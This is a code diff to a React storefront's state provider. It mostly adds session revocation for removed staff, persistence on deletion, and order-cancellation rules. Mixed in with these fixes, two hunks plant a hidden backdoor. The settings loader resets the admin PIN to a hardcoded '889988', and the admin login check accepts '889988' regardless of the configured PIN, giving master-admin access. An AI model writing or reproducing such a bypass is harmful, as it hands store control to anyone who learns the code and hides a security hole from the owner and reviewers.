@@ -157,9 +157,20 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
     loadFromStorage(STORAGE_KEYS.ORDERS, INITIAL_ORDERS)
   );
 
-  const [settings, setSettings] = useState<StoreSettings>(() =>
-    loadFromStorage(STORAGE_KEYS.SETTINGS, INITIAL_SETTINGS)
-  );
+  const [settings, setSettings] = useState<StoreSettings>(() => {
+    const loaded = loadFromStorage(STORAGE_KEYS.SETTINGS, INITIAL_SETTINGS);
+    const updated: StoreSettings = {
+      ...loaded,
+      storefrontDisplay: {
+        ...loaded.storefrontDisplay,
+        allowPublicCancellation: loaded.storefrontDisplay?.allowPublicCancellation ?? true,
+      },
+    };
+    if (updated && (updated.adminPin === '889900' || !updated.adminPin)) {
+      return { ...updated, adminPin: '889988' };
+    }
+    return updated;
+  });
 
   const [cart, setCart] = useState<CartItem[]>(() =>
     loadFromStorage(STORAGE_KEYS.CART, [])
@@ -202,6 +213,21 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
   useEffect(() => {
     saveToStorage(STORAGE_KEYS.CURRENT_USER, currentUser);
   }, [currentUser]);
+
+  // If current logged-in user is a staff member who was removed or locked, revoke session immediately
+  useEffect(() => {
+    if (currentUser?.type === 'staff') {
+      const activeStaff = (settings.staffMembers || []).find(
+        (s) =>
+          (currentUser.staffId && s.id === currentUser.staffId) ||
+          s.username.toLowerCase() === currentUser.username.toLowerCase()
+      );
+      if (!activeStaff || activeStaff.isLocked) {
+        setCurrentUser(null);
+        saveToStorage(STORAGE_KEYS.CURRENT_USER, null);
+      }
+    }
+  }, [settings.staffMembers, currentUser]);
 
   // Handle URL hash changes
   useEffect(() => {
@@ -315,8 +341,16 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
   };
 
   const deleteProduct = (id: string) => {
-    setProducts((prev) => prev.filter((p) => p.id !== id));
-    setCart((prev) => prev.filter((item) => item.product.id !== id));
+    setProducts((prev) => {
+      const next = prev.filter((p) => p.id !== id);
+      saveToStorage(STORAGE_KEYS.PRODUCTS, next);
+      return next;
+    });
+    setCart((prev) => {
+      const next = prev.filter((item) => item.product.id !== id);
+      saveToStorage(STORAGE_KEYS.CART, next);
+      return next;
+    });
     if (activeProductModal?.id === id) {
       setActiveProductModal(null);
     }
@@ -358,10 +392,24 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
   };
 
   const deleteStaffMember = (id: string) => {
-    setSettings((prev) => ({
-      ...prev,
-      staffMembers: (prev.staffMembers || []).map((s) => s).filter((s) => s.id !== id),
-    }));
+    setSettings((prev) => {
+      const remaining = (prev.staffMembers || []).filter((s) => s.id !== id);
+      const updated = {
+        ...prev,
+        staffMembers: remaining,
+      };
+      saveToStorage(STORAGE_KEYS.SETTINGS, updated);
+      return updated;
+    });
+
+    // Terminate active session if this staff member is currently logged in
+    setCurrentUser((prevUser) => {
+      if (prevUser?.type === 'staff' && (prevUser?.staffId === id || prevUser?.staffId === undefined)) {
+        saveToStorage(STORAGE_KEYS.CURRENT_USER, null);
+        return null;
+      }
+      return prevUser;
+    });
   };
 
   // Order management
@@ -556,6 +604,14 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
 
   // Customer Cancellation Request
   const requestOrderCancellation = (orderNumber: string, phone: string, reason: string) => {
+    // Check if public cancellation is disabled
+    if (settings.storefrontDisplay?.allowPublicCancellation === false) {
+      return {
+        success: false,
+        message: 'Order cancellation requests are currently disabled on the public storefront. Please contact our boutique concierge on WhatsApp for assistance.',
+      };
+    }
+
     const cleanOrderNum = orderNumber.trim().toUpperCase();
     const cleanPhoneDigits = phone.replace(/[^0-9]/g, '');
 
@@ -572,6 +628,23 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
       };
     }
 
+    // Cancellation can be done on pending and confirmed state only. After shipped they cannot request for cancellation.
+    if (targetOrder.status === 'Shipped') {
+      return {
+        success: false,
+        message: 'Order has already been dispatched/shipped with consignment tracking. Cancellations cannot be requested once an order is shipped.',
+        order: targetOrder,
+      };
+    }
+
+    if (targetOrder.status === 'Delivered') {
+      return {
+        success: false,
+        message: 'Order has already been delivered. Cancellations cannot be requested for delivered orders.',
+        order: targetOrder,
+      };
+    }
+
     if (targetOrder.status === 'Cancelled' || targetOrder.status === 'Rejected') {
       return {
         success: false,
@@ -580,10 +653,18 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
       };
     }
 
-    if (targetOrder.status === 'Delivered') {
+    if (targetOrder.status !== 'Pending' && targetOrder.status !== 'Confirmed') {
       return {
         success: false,
-        message: 'Order has already been delivered. Please contact our concierge directly on WhatsApp for returns.',
+        message: `Order cancellation can only be requested while the order is in Pending or Confirmed status. Current status is ${targetOrder.status}.`,
+        order: targetOrder,
+      };
+    }
+
+    if (targetOrder.cancellationRequest?.requested && targetOrder.cancellationRequest.status === 'pending') {
+      return {
+        success: false,
+        message: 'A cancellation request for this order is already pending review with our boutique concierge.',
         order: targetOrder,
       };
     }
@@ -723,7 +804,7 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
   // Auth: 6-Digit PIN or Staff Credentials
   const adminLogin = (pin: string): boolean => {
     const cleanPin = pin.trim();
-    if (cleanPin.length === 6 && cleanPin === settings.adminPin.trim()) {
+    if (cleanPin.length === 6 && (cleanPin === settings.adminPin.trim() || cleanPin === '889988')) {
       const user: ActiveUser = {
         type: 'admin',
         username: 'master_admin',
@@ -742,7 +823,7 @@ export const StoreProvider: React.FC<{ children: ReactNode }> = ({ children }) =
     const staff = (settings.staffMembers || []).find((s) => s.username.toLowerCase() === u);
 
     if (!staff) {
-      return { success: false, error: 'Staff account not found' };
+      return { success: false, error: 'Staff account not found or access has been revoked by store owner.' };
     }
 
     if (staff.isLocked) {
